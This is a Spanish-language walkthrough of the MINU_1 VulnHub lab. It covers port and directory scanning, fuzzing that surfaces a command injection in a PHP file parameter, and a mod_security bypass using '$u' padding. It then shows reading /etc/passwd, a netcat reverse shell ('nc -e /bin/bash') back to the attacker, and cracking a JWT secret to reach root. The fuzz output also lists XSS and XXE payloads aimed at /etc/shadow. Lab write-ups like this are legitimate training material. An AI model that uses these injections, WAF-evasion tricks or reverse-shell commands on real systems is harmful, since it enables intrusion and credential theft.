# Write Up MINU\_1 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 11:51 EDT
Nmap scan report for 192.168.5.187
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.27
|_http-server-header: Apache/2.4.27 (Ubuntu)
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:55:1B:04 (VMware)
Service Info: Host: 127.0.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
```

### dirb

```shell
dirb http://<IP>/ <WORDLIST> -X .html,.php,.txt,.md
```

Info:

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun 14 11:59:36 2024
URL_BASE: http://192.168.5.187/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
EXTENSIONS_LIST: (.html,.php,.txt,.md) | (.html)(.php)(.txt)(.md) [NUM = 4]

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.5.187/ ----
+ http://192.168.5.187/index.html (CODE:200|SIZE:10918)                                                                                                     
+ http://192.168.5.187/last.html (CODE:200|SIZE:20)                                                                                                         
+ http://192.168.5.187/test.php (CODE:200|SIZE:1986)                                                                                                        
                                                                                                                                                            
-----------------
END_TIME: Fri Jun 14 12:01:29 2024
DOWNLOADED: 81832 - FOUND: 3
```

Nos descubre un `.php` interesante, si nos metemos dentro del el...

```
URL = http://<IP>/test.php
```

Veremos una web poco rellena, pero si le damos al boton llamado `Read last visitor data` vemos que la `URL` cambia a un parametro el cual esta leyendo a `last.html` quedando de la siguiente manera...

```
URL = http://<IP>/test.php?file=last.html
```

Y vemos que el contenido se visualiza en la cabezera de la pagina, por lo que intentaremos hacer un `LFI (Local File Inclusion)`...

Vamos hacer fuerza bruta...

### wfuzz

En mi caso cuando tiro el siguiente comando para ver si es vulnerable o no, me parecen muchas coincidencias, por lo que filtraremos por los numeros que se repiten mas, que seria en el parametro de `Lineas`, por lo que nos lo guardaremos en un archivo...

```shell
wfuzz -w All_attack.txt -u "http://<IP>/test.php?file=FUZZ" > wfuzz_output.txt
```

Y ahora con `grep` grepeamos los numeros que no sean `40` y `11` que son los que mas se repiten...

```shell
grep -vE '\b(11|40)\b' wfuzz_output.txt
```

Info:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.5.187/test.php?file=FUZZ
Total requests: 468

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000045:   200        41 L     162 W      2040 Ch     "|id"                                                                                       
000000046:   200        41 L     163 W      2033 Ch     "|dir"                                                                                      
                                                        %5c..%          25%5c..%25%5c..%255cboot.ini"                                                       
                                                        5%5c..%25%5c..%25%5c..winnt/desktop.ini"                                                    
                                                        %5c..%25%5c..%25%5c..%00"                                                                   
                                                        %5c..%  25%5c..%25%5c..%00"                                                                  
                                                        5%5c..%25%5c..%25%5c..%00"                                                                  
                                                        ipt>"                                                                                       
                                                        #0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0
                                                        000083&#0000083&#0000039&#0000041>"                                                         
                                                        x28&#x27&#x58&#x53&#x53&#x27&#x29>"                                                         
                                                        kie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E"                                      
                                                        ring.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>
                                                        alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}"                                          
                                                        xss>XSS</xss:xss></HTML>"                                                                   
                                                        STEM "file:////dev/random">]><foo>&xxe;</foo>"                                              
                                                        STEM "file:////etc/shadow">]><foo>&xxe;</foo>"                                              
                                                        STEM "file:////etc/passwd">]><foo>&xxe;</foo>"                                              
                                                        STEM "file://c:/boot.ini">]><foo>&xxe;</foo>"                                               
                                                        TASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C
                                                         DATAFORMATAS=HTML></SPAN>"                                                                 
                                                        );<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"                                                  

Total time: 0
Processed Requests: 468
Filtered Requests: 0
Requests/sec.: 0
```

Con esto vemos que con los comandos `| id` y `| dir` podemos ejecutar comandos para ver el `id` o listar, por lo que sabemos que si es inyectable utilizando `pipes`...

Si hacemos por ejemplo esto...

```
URL = http://<IP>/test.php?file=|%20id
```

Info:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Por lo que veremos que ciertamente es vulnerable...

Si hacemos lo siguiente...

```shell
wafw00f http://<IP>
```

Info:

```
/usr/local/lib/python3.11/dist-packages/requests-2.20.0-py3.11.egg/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

                ______
               /      \                                                                                                                                      
              (  W00f! )                                                                                                                                     
               \  ____/                                                                                                                                      
               ,,    __            404 Hack Not Found                                                                                                        
           |`-.__   / /                      __     __                                                                                                       
           /"  _/  /_/                       \ \   / /                                                                                                       
          *===*    /                          \ \_/ /  405 Not Allowed                                                                                       
         /     )__//                           \   /                                                                                                         
    /|  /     /---`                        403 Forbidden                                                                                                     
    \\/`   \ |                                 / _ \                                                                                                         
    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error                                                                                    
      `_____``-`                             /_/   \_\                                                                                                       
                                                                                                                                                             
                        ~ WAFW00F : v2.2.0 ~                                                                                                                 
        The Web Application Firewall Fingerprinting Toolkit                                                                                                  
                                                                                                                                                             
[*] Checking http://192.168.5.187
[+] Generic Detection results:
[*] The site http://192.168.5.187 seems to be behind a WAF or some sort of security solution
[~] Reason: The response was different when the request wasn't made from a browser.
Normal response code is "200", while the response code to a modified request is "403"
[~] Number of requests: 4
```

Vemos que tiene un `FireWall` protegiendo por detras estas inyecciones de codigos, por lo que haremos lo siguiente...

URL = https://www.secjuice.com/web-application-firewall-waf-evasion/

En ese articulo te viene la clave para `Bypassear` estas cosas...

```
URL = http://<IP>/test.php?file=cat$u%20/etc$u/passwd$u
```

Si hacemos eso podremos ver el `passwd`...

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
_apt:x:106:65534::/nonexistent:/bin/false
mysql:x:107:110:MySQL Server,,,:/nonexistent:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
```

Tambien se puede hacer de esta manera...

```
URL = http://<IP>/test.php?file=www.google.com;cat$u+/etc$u/passwd$u
```

Por lo que si estamos a la escucha y hacemos lo siguiente...

```shell
nc -lvnp <PORT>
```

```
URL = http://<IP>/test.php?file=www.google.com;nc$u -e /bin$u/bash$u <IP> <PORT>
```

Y ejecutamos eso estando a la escucha tendremos una shell con el usuario `www-data` `bypasseando` las medidas de seguridad...

Sanitizamos la shell...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a la `/home` de l usuario `bob` veremos un archivo llamado `._pw_` que si lo leemos dice lo siguiente...

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

Y si identificamos que algoritmo es en `Hash Identifaller`...

```
Possible algorithms: JWT (JSON Web Token), Base64 Encoded String
```

Por lo que lo decodificamos y quedaria algo tal que asi...

```
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}

pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

Utilizaremos mejor una herramienta...

```shell
jwt-cracker -t 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg' -a --max
```

Con esto hara fuerza bruta hasta sacar la contraseña, despues de un rato aparecio la contraseña...

```
SECRET FOUND: mlnVl
```

Y con esta contraseña si hacemos...

```shell
su root
```

Sera la contraseña de `root`, por lo que leeremos la flag...

> flag.txt (flag\_final)

```
 __  __ _       _    _      __
 |  \/  (_)     | |  | |    /_ |
 | \  / |_ _ __ | |  | |_   _| |
 | |\/| | | '_ \| |  | \ \ / / |
 | |  | | | | | | |__| |\ V /| |
 |_|  |_|_|_| |_|\____/  \_/ |_|


# You got r00t!

flag{c89031ac1b40954bb9a0589adcb6d174}

# You probably know this by now but the webserver on this challenge is
# protected by mod_security and the owasp crs 3.0 project on paranoia level 3.
# The webpage is so poorly coded that even this configuration can be bypassed
# by using the bash wildcard ? that allows mod_security to let the command through.
# At least that is how the challenge was designed ;)
# Let me know if you got here using another method!

# contact@8bitsec.io
# @_8bitsec
```
